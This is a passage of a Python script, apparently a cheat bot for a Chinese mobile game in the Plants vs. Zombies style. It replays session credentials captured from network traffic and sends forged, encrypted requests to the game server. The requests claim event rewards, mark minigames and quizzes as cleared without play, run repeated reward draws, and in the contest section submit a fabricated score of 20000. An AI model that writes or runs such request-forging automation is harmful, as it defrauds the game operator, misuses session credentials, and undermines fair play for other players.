                    item['s'] = jieshu_value
                break
    for item in pl_list:
        i_original = int(item['i'])
        if i_original < 2000 or 100000 < i_original < 190000:
            i_new = i_original + 100
        elif 199999 < i_original < 1000000:
            i_new = i_original * 10 + 20000000
        else:
            i_new = i_original
        item['i'] = str(i_new)
    s_dict = {item['i']: int(item['s']) for item in pl_list}
    level_dict = {}
    for item in pcl_list:
        i_value = item['i']
        level_dict[i_value] = s_dict.get(i_value, 0)
    for i_value, s_value in s_dict.items():
        if i_value not in level_dict:
            level_dict[i_value] = s_value
    return level_dict

def zhiwutanxian():
    探险 = {"噗噗鱼藤": "22001370","千金藤": "22000160","芦荟医师": "111189","番莲工程师": "111168","毒影菇": "111151","原始豌豆射手": "111135","潜伏芹菜": "111125","红针花": "111109","旋转芜菁": "1183","火焰豌豆射手": "1178","大喷菇": "1150","闪电芦苇": "1122","海蘑菇": "22001360","石斛防风网": "22000180","冬瓜守卫": "111191","莲藕射手": "111166","月光花": "111152","香水蘑菇": "111137","复活萝卜": "111128","菠萝蜜": "111114","电离红掌": "1190","漩涡枇杷": "1189","鳄梨": "1168","缠绕水草": "1166","磁力菇": "1155","冰冻生菜": "1106","坚果": "1103","土豆地雷": "1104","白萝卜": "1135","火葫芦": "1134","巴豆": "1115","双向射手": "1116","弹簧豆": "1110","地刺": "1111","玉米投手": "1121","向日葵": "1102","卷心菜投手": "1105","豌豆射手": "1101","宇宙豌豆": "22001830","重力树": "22001860",}
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V316","e":{"b":"0","n":"","pi":pi,"sk":sk,"ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    pcl_list = decrypted_json['e']['d'].get('pcl', [])
    pl_list = decrypted_json['e']['d'].get('pl', [])
    for item in pl_list:
        i_value = item['i']
        s_value = item['s']
        found = False
        jieshu_value = None
        for plant_dict in plant_list:
            plant_id = next(iter(plant_dict))
            if int(plant_id) == int(i_value):
                found = True
                jieshu_value = plant_dict.get('jieshu')
                break
        if found:
            s_int = int(s_value)
            jieshu_int = int(jieshu_value)
            if s_int > jieshu_int:
                item['s'] = jieshu_value
            else:
                pass
        else:
            print(f"植物编号 {i_value} 在 p_list 中未找到，跳过")
    for item in pl_list:
        i_original = int(item['i'])
        if i_original < 2000 or 100000 < i_original < 190000:
            i_new = i_original + 100
        elif 199999 < i_original < 1000000:
            i_new = i_original * 10 + 20000000
        else:
            i_new = i_original
        item['i'] = str(i_new)
    s_dict = {item['i']: item['s'] for item in pl_list}
    existing_i_set = set()
    for item in pcl_list:
        i_value = item['i']
        existing_i_set.add(i_value)
        if i_value in s_dict:
            item['s'] = s_dict[i_value]
    for i_value, s_value in s_dict.items():
        if i_value not in existing_i_set:
            new_item = {'i': i_value, 'q': '0', 's': s_value}
            pcl_list.append(new_item)
    result = []
    for name, target_i in 探险.items():
        for item in pcl_list:
            if item['i'] == target_i:
                s_value = int(item.get('s', '0'))
                q_value = int(item['q'])
                new_s = s_value + 1
                result.append(f"{name}{new_s}阶×{q_value}")
                break
        else:
            result.append(f"{name}0阶")
    print_in_columns(result, num_columns=3, column_spacing=2)
def huiyixiaoyouxi():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10836, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi":pi, "sk": sk, "ui":ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("回忆状态更新成功")
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        data_str = json.loads(decrypted_json['e']['d'][0]['data'])
        result = []
        for sublist in data_str['mg']['level']:
            for item in sublist:
                if item['s'] == False:
                    result.append(item['id'])
        for id in result:
            data = {"req":"V979","e":{"id":id,"pi":pi,"sk":sk,"ui":ui},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            time.sleep(0.3)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print(f"回忆小游戏{id}过关成功")
            else:
                print(f"回忆小游戏{id}过关失败")
    else:
        print("回忆状态更新失败")
def huiyixiaoyouxichengjiu():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10836, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi":pi, "sk": sk, "ui":ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("回忆状态更新成功")
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        data_str = json.loads(decrypted_json['e']['d'][0]['data'])
        false_s_ids = [item['id'] for item in data_str['mg']['task'] if item.get('s') is False]
        for id in false_s_ids:
            data = {"req":"V978","e":{"id":id,"pi":pi,"sk":sk,"ui":ui},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            time.sleep(0.3)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print(f"回忆小游戏成就领取成功")
            else:
                print(f"回忆小游戏成就领取失败")
    else:
        print("回忆状态更新失败")

def zhishiwenda():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10907, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("答题刷新成功")
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        op_value = decrypted_json["e"]["d"][0].get("op")
        if op_value == 0 or op_value == None:
            print("活动未开启")
        elif op_value == 1:
            data = {"req":"V1290","e":{"pi":pi,"s":"5","sk":sk,"ui":ui},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("答题成功")
                data = {"req": "V303", "e": {"al": [{"id": 10907, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                decrypted_response = get_decrypted_data(url, data=response)
                decrypted_json = json.loads(decrypted_response)
                inner_data = json.loads(decrypted_json["e"]["d"][0]["data"])
                d_int = int(inner_data['d'])
                rpn_value = int(inner_data['rpn'])
                indices = []
                for i, task in enumerate(inner_data['task_list']):
                    condition = task['condition']
                    is_receive = task['is_receive']
                    if condition <= d_int and is_receive == False:
                        indices.append(i)
                for id in indices:
                    data =  {"req":"V1292","e":{"id":id,"pi":pi,"sk":sk,"ui":ui},"ev":3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 20013:
                        print("当前请求文本已过期，需重新抓包")
                    elif response_data.get("r") == 0:
                        print("累计答题奖励领取成功")
                    else:
                        print("累计答题奖励领取失败")
                for i in range(rpn_value):
                    data =  {"req":"V1291","e":{"pi":pi,"sk":sk,"ui":ui},"ev":3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 20013:
                        print("当前请求文本已过期，需重新抓包")
                    elif response_data.get("r") == 0:
                        decrypted_response = get_decrypted_data(url, data=response)
                        decrypted_json = json.loads(decrypted_response)
                        i_value = str(decrypted_json['e']['d']['reward'][0]['i'])
                        q_value = decrypted_json['e']['d']['reward'][0]['q']
                        plant_info = formatted_plant.get(
                            i_value,
                            {"name": f"未知物品({i_value})", "pinzhi": "default"}
                        )
                        plant_name = plant_info["name"]
                        plant_pinzhi = plant_info["pinzhi"]
                        color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                        print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR}×{q_value}")
                    else:
                        print("福袋奖励领取失败")
            elif response_data.get("r") == 76060:
                print("今日已答题")
            else:
                print("答题失败")
    else:
        print("答题刷新失败")
def yijian():
    try:
        pi, ui, sk = get_pi_sk(加密)
        data = {"req":"V303","e":{"al":[{"id":10851,"abi":0,"type":1,"config_version":1},{"id":10613,"abi":0,"type":1,"config_version":1},{"id":10799,"abi":0,"type":1,"config_version":1},{"id":10844,"abi":0,"type":1,"config_version":1},{"id":10893,"abi":0,"type":1,"config_version":1},{"id":10882,"abi":0,"type":1,"config_version":1},{"id":10892,"abi":0,"type":1,"config_version":1},{"id":10833,"abi":0,"type":1,"config_version":1},{"id":10871,"abi":0,"type":1,"config_version":1},{"id":10898,"abi":0,"type":1,"config_version":1},{"id":10894,"abi":0,"type":1,"config_version":1},{"id":10907,"abi":0,"type":1,"config_version":1},{"id":10863,"abi":0,"type":1,"config_version":1},{"id":10622,"abi":0,"type":1,"config_version":1},{"id":10803,"abi":0,"type":1,"config_version":1},{"id":10836,"abi":0,"type":1,"config_version":1},{"id":10859,"abi":0,"type":1,"config_version":1},{"id":10710,"abi":0,"type":1,"config_version":1},{"id":10897,"abi":0,"type":1,"config_version":1},{"id":10861,"abi":0,"type":1,"config_version":1},{"id":10889,"abi":0,"type":1,"config_version":1},{"id":10903,"abi":0,"type":1,"config_version":1},{"id":10896,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            for item in decrypted_json['e']['d']:
                if item.get('op') == 1:
                    if int(item.get('id')) == 10851:
                        print("僵博挑战活动开启")
                        inner_data = json.loads(item["data"])
                        task_values = inner_data.get('task_list', [])
                        ri_list = []
                        zhou_list = []
                        xianding_list = []
                        for i, task_dict in enumerate(task_values):
                            for key, value in task_dict.items():
                                if value != 1:
                                    if i == 0:
                                        ri_list.append(key)
                                    elif i == 1:
                                        zhou_list.append(key)
                                    elif i == 2:
                                        xianding_list.append(key)
                        for ti in ri_list:
                            data = {"req":"V432","e":{"pi":pi,"sk":sk,"ti":ti,"type":"0","ui":ui},"ev":3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("令营日任务领取成功")
                            else:
                                print("令营日任务领取失败")
                    elif int(item.get('id')) == 10613:
                        for i in range(12):
                            data ={"req": "V273", "e": {"bi": "0", "d": [{"id": 0, "t": 132.715591, "l": 0.0, "k": 1}], "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("僵博挑战成功")
                            else:
                                print("僵博挑战失败")
                            time.sleep(0)
                        for i in range(100):
                            data = {"req":"V347","e":{"lct":"1","pi":pi,"sk":sk,"t":"10799","ui":ui},"ev":3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("奖励抽取成功")
                            else:
                                print("奖励抽取失败")
                                break
                            time.sleep(0)

                    elif int(item.get('id')) == 10844:
                        print("时空寻宝活动开启")
                        data_str = json.loads(item['data'])
                        tbl_list = []
                        tbl_dict = data_str.get('tbl', {})
                        for key, value in tbl_dict.items():
                            if value == 0:
                                data ={"req":"V985","e":{"pi":pi,"sk":sk,"t":"1","ti":key,"ui":ui},"ev":3}
                                encrypted_data, head = get_encrypted_data(data, url)
                                response = _do_post(head, encrypted_data, data)
                                response_data = json.loads(response.text)
                                if response_data.get("r") == 20013:
                                    print("当前请求文本已过期，需重新抓包")
                                elif response_data.get("r") == 0:
                                    print("电池领取成功")
                                else:
                                    print("电池领取失败")
                        data = {"req":"V303","e":{"al":[{"id":10844,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            decrypted_response = get_decrypted_data(url, data=response)
                            decrypted_json = json.loads(decrypted_response)
                            op_value = decrypted_json["e"]["d"][0].get("op")
                            if op_value == 0 or op_value == None:
                                print("活动未开启")
                            elif op_value == 1:
                                data_str = json.loads(decrypted_json['e']['d'][0]['data'])
                                current_battery = int(data_str.get('nwmn') or 0)
                                battery_needed = int(data_str.get('npwn') or 0)
                                fl_list = data_str.get('fl', [])
                                has_unclaimed = any(item.get('t') == 1 for item in fl_list if isinstance(item, dict))
                                if has_unclaimed:
                                    data ={"req":"V986","e":{"pi":pi,"sk":sk,"t":"3","ui":ui},"ev":3}
                                    encrypted_data, head = get_encrypted_data(data, url)
                                    response = _do_post(head, encrypted_data, data)
                                    response_data = json.loads(response.text)
                                    if response_data.get("r") == 20013:
                                        print("当前请求文本已过期，需重新抓包")
                                    elif response_data.get("r") == 0:
                                        print("奖励领取成功")
                                    else:
                                        print("奖励领取失败")
                                if current_battery >= battery_needed:
                                    data ={"req":"V984","e":{"pi":pi,"sk":sk,"ui":ui,"wn": battery_needed},"ev":3}
                                    encrypted_data, head = get_encrypted_data(data, url)
                                    response = _do_post(head, encrypted_data, data)
                                    response_data = json.loads(response.text)
                                    if response_data.get("r") == 20013:
                                        print("当前请求文本已过期，需重新抓包")
                                    elif response_data.get("r") == 0:
                                        decrypted_response = get_decrypted_data(url, data=response)
                                        decrypted_json = json.loads(decrypted_response)
                                        fl_list = decrypted_json['e']['d']['fl']
                                        first_t0_index = None
                                        for index, item in enumerate(fl_list):
                                            if item.get('t') == 0:
                                                first_t0_index = index
                                                break
                                        target_dict = None
                                        if first_t0_index is not None and first_t0_index > 0:
                                            target_dict = fl_list[first_t0_index - 1]
                                        elif first_t0_index is None:
                                            target_dict = fl_list[-1]
                                        if target_dict and 'i' in target_dict and 'q' in target_dict:
                                            i_value = str(target_dict['i'])
                                            q_value = target_dict['q']
                                            plant_info = formatted_plant.get(
                                                i_value,
                                                {"name": f"未知物品({i_value})", "pinzhi": "default"}
                                            )
                                            plant_name = plant_info["name"]
                                            plant_pinzhi = plant_info["pinzhi"]
                                            color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                            print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR} x{q_value}")
                                        else:
                                            print("未找到符合条件的字典或字典中没有i和q键")
                                        data ={"req":"V986","e":{"pi":pi,"sk":sk,"t":"3","ui":ui},"ev":3}
                                        encrypted_data, head = get_encrypted_data(data, url)
                                        response = _do_post(head, encrypted_data, data)
                                        response_data = json.loads(response.text)
                                        if response_data.get("r") == 20013:
                                            print("当前请求文本已过期，需重新抓包")
                                        elif response_data.get("r") == 0:
                                            print("奖励领取成功")
                                        else:
                                            print("奖励领取失败")
                                    else:
                                        print("奖励开启失败")
                        data = {"req":"V303","e":{"al":[{"id":10844,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            decrypted_response = get_decrypted_data(url, data=response)
                            decrypted_json = json.loads(decrypted_response)
                            op_value = decrypted_json["e"]["d"][0].get("op")
                            if op_value == 0 or op_value == None:
                                print("活动未开启")
                            elif op_value == 1:
                                data_str = json.loads(decrypted_json['e']['d'][0]['data'])
                                current_battery = int(data_str.get('nwmn') or 0)
                                battery_needed = int(data_str.get('npwn') or 0)
                                if current_battery >= battery_needed:
                                    cs_value = int(current_battery / battery_needed)
                                    css_value = math.ceil(cs_value / 5)
                                    for _ in range(css_value):
                                        if cs_value > 5:
                                            cs_values = 5
                                            for i in range(cs_values):
                                                data ={"req":"V984","e":{"pi":pi,"sk":sk,"ui":ui,"wn": battery_needed},"ev":3}
                                                encrypted_data, head = get_encrypted_data(data, url)
                                                response = _do_post(head, encrypted_data, data)
                                                response_data = json.loads(response.text)
                                                if response_data.get("r") == 20013:
                                                    print("当前请求文本已过期，需重新抓包")
                                                elif response_data.get("r") == 0:
                                                    decrypted_response = get_decrypted_data(url, data=response)
                                                    decrypted_json = json.loads(decrypted_response)
                                                    fl_list = decrypted_json['e']['d']['fl']
                                                    first_t0_index = None
                                                    for index, item in enumerate(fl_list):
                                                        if item.get('t') == 0:
                                                            first_t0_index = index
                                                            break
                                                    target_dict = None
                                                    if first_t0_index is not None and first_t0_index > 0:
                                                        target_dict = fl_list[first_t0_index - 1]
                                                    elif first_t0_index is None:
                                                        target_dict = fl_list[-1]
                                                    if target_dict and 'i' in target_dict and 'q' in target_dict:
                                                        i_value = str(target_dict['i'])
                                                        q_value = target_dict['q']
                                                        plant_info = formatted_plant.get(
                                                            i_value,
                                                            {"name": f"未知物品({i_value})", "pinzhi": "default"}
                                                        )
                                                        plant_name = plant_info["name"]
                                                        plant_pinzhi = plant_info["pinzhi"]
                                                        color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                                        print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR} x{q_value}")
                                                    else:
                                                        print("未找到符合条件的字典或字典中没有i和q键")
                                                else:
                                                    print("奖励开启失败")
                                            if cs_values > 0 and response_data.get("r") == 0:
                                                data ={"req":"V986","e":{"pi":pi,"sk":sk,"t":"3","ui":ui},"ev":3}
                                                encrypted_data, head = get_encrypted_data(data, url)
                                                response = _do_post(head, encrypted_data, data)
                                                response_data = json.loads(response.text)
                                                if response_data.get("r") == 20013:
                                                    print("当前请求文本已过期，需重新抓包")
                                                elif response_data.get("r") == 0:
                                                    print("奖励领取成功")
                                                else:
                                                    print("奖励领取失败")
                                            cs_value -= 5
                                    for i in range(cs_value):
                                        data ={"req":"V984","e":{"pi":pi,"sk":sk,"ui":ui,"wn": battery_needed},"ev":3}
                                        encrypted_data, head = get_encrypted_data(data, url)
                                        response = _do_post(head, encrypted_data, data)
                                        response_data = json.loads(response.text)
                                        if response_data.get("r") == 20013:
                                            print("当前请求文本已过期，需重新抓包")
                                        elif response_data.get("r") == 0:
                                            decrypted_response = get_decrypted_data(url, data=response)
                                            decrypted_json = json.loads(decrypted_response)
                                            fl_list = decrypted_json['e']['d']['fl']
                                            first_t0_index = None
                                            for index, item in enumerate(fl_list):
                                                if item.get('t') == 0:
                                                    first_t0_index = index
                                                    break
                                            target_dict = None
                                            if first_t0_index is not None and first_t0_index > 0:
                                                target_dict = fl_list[first_t0_index - 1]
                                            elif first_t0_index is None:
                                                target_dict = fl_list[-1]
                                            if target_dict and 'i' in target_dict and 'q' in target_dict:
                                                i_value = str(target_dict['i'])
                                                q_value = target_dict['q']
                                                plant_info = formatted_plant.get(
                                                    i_value,
                                                    {"name": f"未知物品({i_value})", "pinzhi": "default"}
                                                )
                                                plant_name = plant_info["name"]
                                                plant_pinzhi = plant_info["pinzhi"]
                                                color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                                print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR} x{q_value}")
                                            else:
                                                print("未找到符合条件的字典")
                                        else:
                                            print("奖励开启失败")
                                    if cs_value > 0 and response_data.get("r") == 0:
                                        data ={"req":"V986","e":{"pi":pi,"sk":sk,"t":"3","ui":ui},"ev":3}
                                        encrypted_data, head = get_encrypted_data(data, url)
                                        response = _do_post(head, encrypted_data, data)
                                        response_data = json.loads(response.text)
                                        if response_data.get("r") == 20013:
                                            print("当前请求文本已过期，需重新抓包")
                                        elif response_data.get("r") == 0:
                                            print("奖励领取成功")
                                        else:
                                            print("奖励领取失败")
                                else:
                                    if current_battery > 0:
                                        data ={"req":"V984","e":{"pi":pi,"sk":sk,"ui":ui,"wn": current_battery},"ev":3}
                                        encrypted_data, head = get_encrypted_data(data, url)
                                        response = _do_post(head, encrypted_data, data)
                                        response_data = json.loads(response.text)
                                        if response_data.get("r") == 20013:
                                            print("当前请求文本已过期，需重新抓包")
                                        elif response_data.get("r") == 0:
                                            print("电池消耗成功")
                                        else:
                                            print("电池消耗失败")
                        data = {"req":"V303","e":{"al":[{"id":10844,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            decrypted_response = get_decrypted_data(url, data=response)
                            decrypted_json = json.loads(decrypted_response)
                            op_value = decrypted_json["e"]["d"][0].get("op")
                            if op_value == 0 or op_value == None:
                                print("活动未开启")
                            elif op_value == 1:
                                data_str = json.loads(decrypted_json['e']['d'][0]['data'])
                                personal_progress = int(data_str.get('pwc', 0))
                                all_server_progress = int(data_str.get('awc', 0))
                                agal_list = data_str.get('agal', [])
                                agal_indices = []
                                for idx, item in enumerate(agal_list):
                                    conditions = item.get('conditions', 0)
                                    is_get = item.get('isGet', 0)
                                    if conditions <= all_server_progress and is_get == 0:
                                        agal_indices.append(idx)
                                for idx in agal_indices:
                                    data = {"req":"V860","e":{"index":idx,"pi":pi,"sk":sk,"t":"2","ui":ui},"ev":3}
                                    encrypted_data, head = get_encrypted_data(data, url)
                                    response = _do_post(head, encrypted_data, data)
                                    response_data = json.loads(response.text)
                                    if response_data.get("r") == 20013:
                                        print("当前请求文本已过期，需重新抓包")
                                    elif response_data.get("r") == 0:
                                        decrypted_response = get_decrypted_data(url, data=response)
                                        decrypted_json = json.loads(decrypted_response)
                                        for item in decrypted_json['e']['d']['bl']:
                                            i_value = str(item['i'])
                                            q_value = item['q']
                                            plant_info = formatted_plant.get(
                                                i_value,
                                                {"name": f"未知物品({i_value})", "pinzhi": "default"}
                                            )
                                            plant_name = plant_info["name"]
                                            plant_pinzhi = plant_info["pinzhi"]
                                            color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                            print(f"全服进度奖励获得: {color_code}{plant_name}{RESET_COLOR} x{q_value}")
                                    else:
                                        print("全服进度奖励领取失败")
                                gal_list = data_str.get('gal', [])
                                gal_indices = []
                                for idx, item in enumerate(gal_list):
                                    conditions = item.get('conditions', 0)
                                    is_get = item.get('isGet', 0)
                                    if conditions <= personal_progress and is_get == 0:
                                        gal_indices.append(idx)
                                for idx in gal_indices:
                                    data ={"req":"V860","e":{"index":idx,"pi":pi,"sk":sk,"t":"1","ui":ui},"ev":3}
                                    encrypted_data, head = get_encrypted_data(data, url)
                                    response = _do_post(head, encrypted_data, data)
                                    response_data = json.loads(response.text)
                                    if response_data.get("r") == 20013:
                                        print("当前请求文本已过期，需重新抓包")
                                    elif response_data.get("r") == 0:
                                        decrypted_response = get_decrypted_data(url, data=response)
                                        decrypted_json = json.loads(decrypted_response)
                                        for item in decrypted_json['e']['d']['bl']:
                                            i_value = str(item['i'])
                                            q_value = item['q']
                                            plant_info = formatted_plant.get(
                                                i_value,
                                                {"name": f"未知物品({i_value})", "pinzhi": "default"}
                                            )
                                            plant_name = plant_info["name"]
                                            plant_pinzhi = plant_info["pinzhi"]
                                            color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                                            print(f"个人进度奖励获得: {color_code}{plant_name}{RESET_COLOR} x{q_value}")
                                    else:
                                        print("个人进度奖励领取失败")
                    elif int(item.get('id')) == 10893:
                        print("趣味竞赛活动开启")
                        game_data = json.loads(item['data'])
                        game_list = game_data['gameList']
                        op1_game_ids = [item['id'] for item in game_list if item.get('op') == 1]
                        all_reward_status_1 = all(item.get('status') == 1 for item in game_data['scoreReward'])
                        all_game_op_1 = all(item.get('op') == 1 for item in game_list)
                        final_op1_game_ids = op1_game_ids if not all_reward_status_1 else []
                        reward_zero_status_indices = [idx for idx, item in enumerate(game_data['scoreReward']) if item.get('status') == 0] if all_game_op_1 else []
                        for id in final_op1_game_ids:
                            data ={"req": "V1070", "e": {"id": id, "pi": pi, "score": "20000", "sk": sk, "type": "1", "ui": ui}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("竞赛简单刷分成功")
                            else:
                                print("竞赛简单刷分失败")
                            data ={"req": "V1070", "e": {"id": id, "pi": pi, "score": "20000", "sk": sk, "type": "2", "ui": ui}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("竞赛困难刷分成功")
                            else:
                                print("竞赛困难刷分失败")
                        for id in reward_zero_status_indices:
                            data ={"req": "V1071", "e": {"id": id, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("竞赛奖励领取成功")
                            else:
                                print("竞赛奖励领取失败")
                            time.sleep(0)
                    elif int(item.get('id')) == 10882:
                        print("大作战活动开启")
                        data_content = item['data']
                        if isinstance(data_content, str):
                             data_dict = json.loads(data_content)
                        else:
                             data_dict = data_content
                        task_values = data_dict.get('task', [])
                        result = [item['type'] for item in task_values if item['status'] != 1]
                        if result:
                            for t_value in result:
                                new_data =  {"req":"V406","e":{"pi":pi,"sk":sk,"t":t_value,"ui":ui},"ev":3}
                                encrypted_data, head = get_encrypted_data(new_data, url)
                                response = _do_post(head, encrypted_data, new_data)
                                response_data = json.loads(response.text)
                                if response_data.get("r") == 20013:
                                     print("当前请求文本已过期，需重新抓包")
                                elif response_data.get("r") == 0:
                                     print("任务获取成功")
                                else:
                                     print("任务获取失败")
                        data = {"req":"V405","e":{"a":"10882","pi":pi,"sk":sk,"ui":ui},"ev":3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 0:
                            print("大作战累计签到成功")
                        else:
                            print("大作战累计签到失败")
                    elif int(item.get('id')) == 10892:
                        print("同游活动开启")
                        for i in range(11):
                            data = {"req": "V1053", "e": {"k": i, "pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
                            encrypted_data, head = get_encrypted_data(data, url)
                            response = _do_post(head, encrypted_data, data)
                            response_data = json.loads(response.text)
                            if response_data.get("r") == 20013:
                                print("当前请求文本已过期，需重新抓包")
                            elif response_data.get("r") == 0:
                                print("获取成功")
                            else:
                                print("获取失败")
                            time.sleep(0)
                        data = {"req": "V303", "e": {"al": [{"id": 10892, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        decrypted_response = get_decrypted_data(url, data=response)
                        decrypted_json = json.loads(decrypted_response)
                        data_str = decrypted_json['e']['d'][0]['data']
                        data = json.loads(data_str)
                        ri_list = []
                        yue_list = []
                        ge_list = []
                        tasks = data.get('task', [])
                        for task in tasks:
                            s_val = task.get('s')
                            t_val = task.get('t')
                            if s_val == 0 and t_val == 0:
                                yue_list.append(task['id'])
                            elif t_val is None and s_val == 0:
                                ri_list.append(task['id'])
                        task_persons = data.get('taskPerson', [])
                        for person in task_persons:
                            if person.get('s') != 2:
                                ge_list.append(person['id'])
                        for k1i in ri_list:
                            if not str(k1i).isdigit():
                                continue
